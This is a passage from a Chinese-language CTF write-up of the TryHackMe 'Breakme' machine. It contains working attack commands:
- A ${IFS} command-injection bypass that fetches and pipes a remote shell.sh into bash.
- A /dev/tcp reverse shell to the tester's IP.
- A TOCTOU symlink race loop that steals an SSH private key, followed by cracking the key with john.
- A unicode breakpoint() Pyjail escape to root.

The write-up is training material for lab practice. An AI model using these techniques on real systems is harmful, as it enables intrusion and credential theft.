6#x26;1 \u0026#x26; \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e空格被过滤了，但是\u003ccode\u003e|\u003c/code\u003e并没有被过滤，我们尝试绕过空格\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeBreakme/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohn|curl\u003cspan class=\"hljs-variable\"\u003e${IFS}\u003c/span\u003e10.21.192.44|\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeBreakme/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以通过 \u003ccode\u003e${IFS}\u003c/code\u003e 绕过空格，我们进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// shell.sh\nbash -i \u003e\u0026#x26; /dev/tcp/10.21.192.44/1234 0\u003e\u0026#x26;1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohn|curl\u003cspan class=\"hljs-variable\"\u003e${IFS}\u003c/span\u003e10.21.192.44/shell.sh|bash|\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e接收到 \u003ccode\u003ejohn\u003c/code\u003e 的 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeBreakme/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到 \u003ccode\u003euser1.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user1.txt\n5c3ea0d312568c7ac68d213785b26677\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To Youcef\u003c/h2\u003e\n\u003cp\u003e执行 \u003ccode\u003e/home/youcef/readfile\u003c/code\u003e 以 \u003ccode\u003eyoucef\u003c/code\u003e 权限运行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohn@Breakme:~$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/home/youcef/readfile\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohn@Breakme:/home/youcef$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 52\ndrwxr-x--- 4 youcef john    4096 Aug  3  2023 .\ndrwxr-xr-x 5 root   root    4096 Feb  3  2024 ..\nlrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -\u003e /dev/null\n-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout\n-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc\ndrwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e\n-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile\n-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile\n-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c\ndrwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们尝试时使用\u003ccode\u003ereadfile\u003c/code\u003e读\u003ccode\u003ereadfile.c\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohn@Breakme:/home/youcef$ ./readfile readfile.c \nNice try!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e… 想读私钥但是不知道命名，我们将 \u003ccode\u003ereadfile\u003c/code\u003e 拉出来逆向\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  struct \u003cspan class=\"hljs-built_in\"\u003estat\u003c/span\u003e stat_buf; // [rsp+20h] [rbp-4B0h] BYREF\n  char buf[1024]; // [rsp+B0h] [rbp-420h] BYREF\n  int v6; // [rsp+4B0h] [rbp-20h]\n  int fd; // [rsp+4B4h] [rbp-1Ch]\n  unsigned __int64 v8; // [rsp+4B8h] [rbp-18h]\n  char *v9; // [rsp+4C0h] [rbp-10h]\n  char *v10; // [rsp+4C8h] [rbp-8h]\n\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( argc == 2 )\n  {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( access(argv[1], 0) )\n    {\n      puts(\u003cspan class=\"hljs-string\"\u003e\"File Not Found\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( getuid() == 1002 )\n    {\n      v10 = strstr(argv[1], \u003cspan class=\"hljs-string\"\u003e\"flag\"\u003c/span\u003e);\n      v9 = strstr(argv[1], \u003cspan class=\"hljs-string\"\u003e\"id_rsa\"\u003c/span\u003e);\n      lstat((char *)argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u0026#x26;stat_buf);\n      HIDWORD(v8) = (stat_buf.st_mode \u0026#x26; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003exF000) == \u003cspan class=\"hljs-number\"\u003e40960\u003c/span\u003e;\n      LODWORD(v8) = access(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);\n      usleep(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n      if ( v10 || v8 \u003e= \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003exFFFFFFFF || v9 )\n      {\n        puts(\"Nice try!\");\n        return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n      }\n      else\n      {\n        puts(\"I guess you won!\\n\");\n        fd = open(argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n        if ( fd \u0026#x3C; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e )\n          __assert_fail(\"fd \u003e= \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026#x26;\u0026#x26; \\\"Failed to open the file\\\"\", \"readfile.c\", \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex26u, \"main\");\n        do\n          v6 = read(fd, buf, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex400uLL);\n        while ( v6 \u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026#x26;\u0026#x26; write(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, buf, v6) \u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e );\n        return \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n      }\n    }\n    else\n    {\n      puts(\"You can't run this program\");\n      return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n    }\n  }\n  else\n  {\n    puts(\"Usage: ./readfile \u0026#x3C;FILE\u003e\");\n    return \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e参数验证\u003c/strong\u003e。这是典型的命令行参数合法性校验，确保用户正确输入文件路径。\u003c/p\u003e\n\u003cp\u003e程序首先检查命令行参数是否为2（即\u003ccode\u003e./readfile \u0026#x3C;FILE\u003e\u003c/code\u003e格式），否则提示用法并退出\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e文件存在性检查\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e通过\u003ccode\u003eaccess(argv[1], 0)\u003c/code\u003e验证文件是否存在，若不存在则输出\"File Not Found\"并终止。此处使用\u003ccode\u003eaccess\u003c/code\u003e系统调用实现快速检查\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e权限控制\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e程序通过\u003ccode\u003egetuid() == 1002\u003c/code\u003e限制只有UID为1002的用户才能执行后续操作，否则提示无权运行。这属于基于用户身份的访问控制（RBAC）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e敏感文件过滤\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003estrstr\u003c/code\u003e检测文件名是否包含\"flag\"或\"id_rsa\"字符串。若存在，则拒绝读取（输出\"Nice try!\"）。这是防止用户访问敏感文件的常见防护措施\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e文件类型与权限校验\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e通过 \u003ccode\u003elstat\u003c/code\u003e 获取文件元数据，检查文件类型是否为符号链接（ \u003ccode\u003estat_buf.st_mode \u0026#x26; 0xF000 == 40960\u003c/code\u003e 对应 \u003ccode\u003eS_IFLNK\u003c/code\u003e 宏），避免符号链接攻击。\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003eaccess(argv[1], 4)\u003c/code\u003e 验证文件是否可读（R_OK权限）。若不可读或为符号链接，则拒绝访问。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e文件读取与输出\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e当通过所有安全检查后，程序以只读模式打开文件（\u003ccode\u003eopen(argv[1], 0)\u003c/code\u003e），循环读取1024字节缓冲区并输出到标准输出，直至文件内容全部读取完毕\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e未处理竞态条件（\u003ccode\u003eTOCTOU\u003c/code\u003e攻击），在 \u003ccode\u003eaccess\u003c/code\u003e 与 \u003ccode\u003eopen\u003c/code\u003e 之间可能被恶意替换文件\u003c/p\u003e\n\u003cp\u003e而一种常见的起因就是代码先检查某个前置条件（例如认证），然后基于这个前置条件进行某项操作，但是在检查和操作的时间间隔内条件却可能被改变，如果代码的操作与安全相关，那么就很可能产生漏洞。这种安全问题也被称做 \u003ccode\u003eTOCTTOU\u003c/code\u003e（\u003cem\u003etime of check\u003c/em\u003e and the \u003cem\u003etime of use\u003c/em\u003e）。\u003c/p\u003e\n\u003cp\u003e存在未处理的\u003cstrong\u003eTOCTOU竞态条件漏洞\u003c/strong\u003e，具体出现在以下代码段:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eLODWORD(v8) = access(argv[1], 4);  // 检查文件可读性（TOCTOU的Check阶段）\nusleep(0);                         // 潜在的时间窗口\n// ... 其他逻辑 ...\nfd = open(argv[1], 0);             // 实际打开文件（TOCTOU的Use阶段）\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eaccess()\u003c/code\u003e函数用于检查文件是否可读（\u003ccode\u003eR_OK\u003c/code\u003e），但后续的\u003ccode\u003eopen()\u003c/code\u003e才是真正操作文件的系统调用。两者之间的时间窗口允许攻击者通过符号链接替换文件。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e攻击者在\u003ccode\u003eaccess()\u003c/code\u003e通过后立即将\u003ccode\u003e/tmp/XYZ\u003c/code\u003e替换为指向\u003ccode\u003e/etc/shadow\u003c/code\u003e的符号链接\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eopen()\u003c/code\u003e实际打开的是被替换的符号链接文件，导致越权读取敏感数据\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这里查看了 \u003ccode\u003eWP\u003c/code\u003e : \u003ca href=\"https://0xb0b.gitbook.io/writeups/tryhackme/2024/breakme#exploitation\"\u003ehttps://0xb0b.gitbook.io/writeups/tryhackme/2024/breakme#exploitation\u003c/a\u003e | \u003ca href=\"https://jaxafed.github.io/posts/tryhackme-breakme/#shell-as-youcef\"\u003ehttps://jaxafed.github.io/posts/tryhackme-breakme/#shell-as-youcef\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etouch\u003c/span\u003e file; \u003cspan class=\"hljs-built_in\"\u003esleep\u003c/span\u003e 0.3; \u003cspan class=\"hljs-built_in\"\u003eln\u003c/span\u003e -sf /home/youcef/.ssh/id_rsa file; \u003cspan class=\"hljs-built_in\"\u003esleep\u003c/span\u003e 0.3; \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e file; \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e out=$(/home/youcef/readfile file | grep -Ev \u003cspan class=\"hljs-string\"\u003e'Found|guess'\u003c/span\u003e| grep .);\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ -n \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$out\u003c/span\u003e\"\u003c/span\u003e ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$out\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6\nTuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z\n.......\ng6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT\nTabCXd2Ji/Y7UvM=\n-----END OPENSSH PRIVATE KEY-----\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们拿到私钥准备进行登陆的时候发现加密了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Breakme ssh youcef@10.10.68.166 -i id_rsa\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e10.10.68.166 (10.10.68.166)\u003cspan class=\"hljs-string\"\u003e' can'\u003c/span\u003et be established.\nED25519 key fingerprint is SHA256:7C+7KD5sXHHAuUddL4pe+CYqXj7LEWGqlWATdS4wRw8.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:139: [hashed name]\nAre you sure you want to \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e connecting (\u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e/no/[fingerprint])? \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e\nWarning: Permanently added \u003cspan class=\"hljs-string\"\u003e'10.10.68.166'\u003c/span\u003e (ED25519) to the list of known hosts.\nEnter passphrase \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e key \u003cspan class=\"hljs-string\"\u003e'id_rsa'\u003c/span\u003e: \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003ejohn\u003c/code\u003e 来破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Breakme ssh2john id_rsa \u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Breakme john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nCost 2 (iteration count) is 16 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 16 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\na123456          (id_rsa)     \n1g 0:00:00:14 DONE (2025-05-28 07:11) 0.07042g/s 54.08p/s 54.08c/s 54.08C/s dominic..123qwe\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003ea123456\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Breakme ssh youcef@10.10.68.166 -i id_rsa                    \nEnter passphrase \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e key \u003cspan class=\"hljs-string\"\u003e'id_rsa'\u003c/span\u003e: \nLinux Breakme 5.10.0-8-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Debian 5.10.46-4 (2021-08-03) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Mar 21 07:55:16 2024 from 192.168.56.1\nyoucef@Breakme:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eyoucef@Breakme:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e youcef on breakme:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser youcef may run the following commands on breakme:\n    (root) NOPASSWD: /usr/bin/python3 /root/jail.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行，貌似只能输入数字，输入字母会输出\u003ccode\u003eWrong Input\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eyoucef@Breakme:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e python3 /root/jail.py\n  Welcome to Python jail  \n  Will you stay locked forever  \n  Or will you BreakMe  \n\u003e\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过收缩引擎搜索，\u003cstrong\u003ePyjail\u003c/strong\u003e 是一种 \u003ccode\u003eCTF\u003c/code\u003e 的题型（知识盲区）\u003c/p\u003e\n\u003cp\u003e通过文章：\u003ca href=\"https://xz.aliyun.com/news/12093\"\u003ehttps://xz.aliyun.com/news/12093\u003c/a\u003e 以及 \u003ca href=\"https://shirajuki.js.org/blog/pyjail-cheatsheet\"\u003ehttps://shirajuki.js.org/blog/pyjail-cheatsheet\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e最后能通过\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePS：\u003ccode\u003ebreakpoint()\u003c/code\u003e 是 Python 3.7 及以上版本内置的调试函数，用于在代码中设置断点，使程序执行到此处时暂停并进入交互式调试模式\u003c/p\u003e\n\u003cp\u003e来执行任意\u003ccode\u003epython\u003c/code\u003e语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eyoucef@Breakme:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e python3 /root/jail.py\n  Welcome to Python jail  \n  Will you stay locked forever  \n  Or will you BreakMe  \n\u003e\u003e 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()\n--Return--\n\u003e \u0026#x3C;string\u003e(1)\u0026#x3C;module\u003e()-\u003eNone\n(Pdb) import os;os.system(\u003cspan class=\"hljs-string\"\u003e'/bin/bash -p'\u003c/span\u003e)\nroot@Breakme:/home/youcef# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取剩余的两个 \u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@Breakme:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /home/youcef/.ssh/user2.txt\ndf5b1b7f4f74a416ae27673b22633c1b\n\nroot@Breakme:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .root.txt\ne257d58481412f8772e9fb9fd47d8ca4\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e感觉不是 medium，对我来说更像是 Hard，新的知识点太多了，真的无从下手，比前面的 Hard 的 Robots 还要难做…\u003c/p\u003e\n\u003cp\u003e其中\u003ccode\u003eTOCTTOU\u003c/code\u003e和\u003ccode\u003epyjail\u003c/code\u003e都是新的知识点\u003c/p\u003e","title":"TryHackMe - Breakme","date":"2025-05-28","updated":"2025-05-28","tags":["TryHackMe","Linux靶机","CommandInject","Pyjail","TOCTOU","WordPress"],"categories":"靶机","comments":true,"description":"Breakme\n\n https://tryhackme.com/room/breakmenu | medium（个人觉得 hard） | Break this secure system and get the flags, if you can.\n \n\nInfomation：We think our system is secure, hack it and prove us wrong.\n\nN..."},"recentPosts":[{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","da
